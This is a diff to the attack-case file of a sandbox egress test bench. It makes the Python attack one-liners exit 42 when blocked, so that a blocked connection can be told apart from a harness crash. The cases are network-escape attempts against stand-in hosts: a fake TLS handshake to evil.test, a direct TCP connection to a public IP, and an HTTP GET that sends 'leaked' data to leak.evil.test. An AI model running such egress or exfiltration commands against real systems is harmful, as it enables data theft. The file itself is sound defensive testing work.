@@ -8,6 +8,8 @@
 # blocked_exit = [..]    -> the exit codes that mean this attack was stopped (curl 35 = TLS handshake
 #                             refused, 22 = proxy 4xx, ...). Any other non-zero exit, such as a crashed
 #                             client's own 1, is a HARNESS-FAULT that fails the run, never a block.
+#                             The python attacks exit 42 on a refused connection and catch OSError, so
+#                             an uncaught exception (exit 1) is a fault, not a block.
 #
 # Placeholders: @WORK@ (bench scratch dir), @BIN@ (dir with the MCP client), @SINK@ (host UDP receiver on port 53; a datagram there is an escape), @KEY@ and @TRAIL@ (NockGuard signing key and signed trail, outside every grant).
 #
@@ -56,16 +58,16 @@ id = "raw-socket-tcp-handrolled"
 class = "raw-socket"
 cmd = '''python3 -c "
 import socket, sys
-s = socket.create_connection((socket.gethostbyname('evil.test'), 443), 5)
-s.send(b'\x16\x03\x01not-a-real-handshake')
-s.settimeout(5)
 try:
+    s = socket.create_connection((socket.gethostbyname('evil.test'), 443), 5)
+    s.send(b'\x16\x03\x01not-a-real-handshake')
+    s.settimeout(5)
     data = s.recv(100)
-except socket.timeout:
+except OSError:
     data = b''
-sys.exit(0 if data[:1] in (b'\x15', b'\x16') else 1)"'''
+sys.exit(0 if data[:1] in (b'\x15', b'\x16') else 42)"'''
 expect = "blocked"
-blocked_exit = [1]
+blocked_exit = [42]
 evidence = "nocklock"
 event = "network_blocked"
 rule = "rule=disallowed_sni"
@@ -74,9 +76,14 @@ match = "host=:443"
 [[attack]]
 id = "tcp-direct-public-ip"
 class = "raw-socket"
-cmd = '''python3 -c "import socket; socket.create_connection(('1.1.1.1', 443), 5)"'''
+cmd = '''python3 -c "
+import socket, sys
+try:
+    socket.create_connection(('1.1.1.1', 443), 5)
+except OSError:
+    sys.exit(42)"'''
 expect = "blocked"
-blocked_exit = [1]
+blocked_exit = [42]
 floor = true
 evidence = "nocklock"
 event = "network_passed"
@@ -95,10 +102,10 @@ try:
     s.sendto(q, (host, int(port)))
     s.recvfrom(512)
 except OSError:
-    sys.exit(1)
+    sys.exit(42)
 sys.exit(0)"'''
 expect = "blocked"
-blocked_exit = [1]
+blocked_exit = [42]
 floor = true
 evidence = "nocklock"
 event = "network_passed"
@@ -109,12 +116,16 @@ id = "dns-exfil-via-stub"
 class = "direct-dns-query"
 cmd = '''python3 -c "
 import socket, sys
-s = socket.create_connection((socket.gethostbyname('leak.evil.test'), 80), 5)
-s.send(b'GET /?d=leaked HTTP/1.0\r\nHost: leak.evil.test\r\n\r\n')
-s.settimeout(5)
-sys.exit(0 if s.recv(100).startswith(b'HTTP/1.1 200') else 1)"'''
+try:
+    s = socket.create_connection((socket.gethostbyname('leak.evil.test'), 80), 5)
+    s.send(b'GET /?d=leaked HTTP/1.0\r\nHost: leak.evil.test\r\n\r\n')
+    s.settimeout(5)
+    reply = s.recv(100)
+except OSError:
+    reply = b''
+sys.exit(0 if reply.startswith(b'HTTP/1.1 200') else 42)"'''
 expect = "blocked"
-blocked_exit = [1]
+blocked_exit = [42]
 evidence = "nocklock"
 event = "network_blocked"
 rule = "rule=disallowed_host"
